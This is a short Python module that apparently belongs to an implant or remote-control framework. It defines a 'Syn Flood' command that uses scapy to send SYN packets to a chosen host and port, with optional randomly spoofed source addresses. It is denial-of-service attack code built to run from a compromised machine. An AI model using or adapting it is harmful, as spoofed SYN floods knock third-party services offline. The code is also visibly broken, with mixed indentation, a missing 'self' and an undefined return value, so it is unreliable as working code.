import random
import sys
from command import Command
from implant.thread_master import run_in_thread

# Suppress scapy import warnings
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import TCP, IP, send, RandShort

D_HOST_KEY = "dhost"
D_PORT_KEY = "dport"
RAND_SRC_KEY = "src"

class SynFlood(Command):
    
    display_name = "Syn Flood"
    index = {D_HOST_KEY:"Destination Host"
    		,D_PORT_KEY:"Destination Port"
    		,RAND_SRC_KEY:"Random Source Flag"}

    def execute(params):
    
        d_host = params[D_HOST_KEY]
        d_port = params[D_PORT_KEY]
        rand_src = params.get(RAND_SRC_KEY) or False
        ip_segment = IP()
        ip_segment.dst = d_host
		if rand_src:
			# randomize class A IP
			ip_segment.src = "%i.%i.%i.%i" % (random.randint(1,126),random.randint(1,254),random.randint(1,254),random.randint(1,254))
			# else - scapy will automatically assign the local IP as src.
		
		tcp_segment=TCP(flags="S")
		tcp_segment.sport = RandShort()
		tcp_segment.dport = int(d_port)
		send(ip_segment/tcp_segment,  verbose=0) # Sends the Packet
    	
    	return syn_flood_thread